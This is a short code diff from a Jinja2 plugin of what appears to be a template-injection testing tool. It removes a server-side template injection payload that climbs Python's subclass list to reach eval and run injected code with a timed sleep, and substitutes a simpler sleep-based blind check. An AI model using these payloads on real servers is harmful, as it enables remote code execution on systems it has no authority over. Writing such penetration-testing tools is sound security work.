@@ -45,13 +45,8 @@ class Jinja2(Plugin):
             'bool_false' : 'True == False'
         },
         'blind_evaluate_bool' : {
-            'call': 'inject',
-            'blind_evaluate_bool': """{%% set d = "%(code)s and __import__('time').sleep(%(delay)i)" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
-    {%% for b in c.__init__.func_globals.values() %%} {%% if b.__class__ == {}.__class__ %%}
-    {%% if 'eval' in b.keys() %%}
-    {{ b['eval'](d) }}
-    {%% endif %%} {%% endif %%} {%% endfor %%}
-    {%% endif %%} {%% endfor %%}"""
+            'call': 'evaluate',
+            'blind_evaluate_bool': """%(code)s and __import__('time').sleep(%(delay)i)"""
         }
 
     }
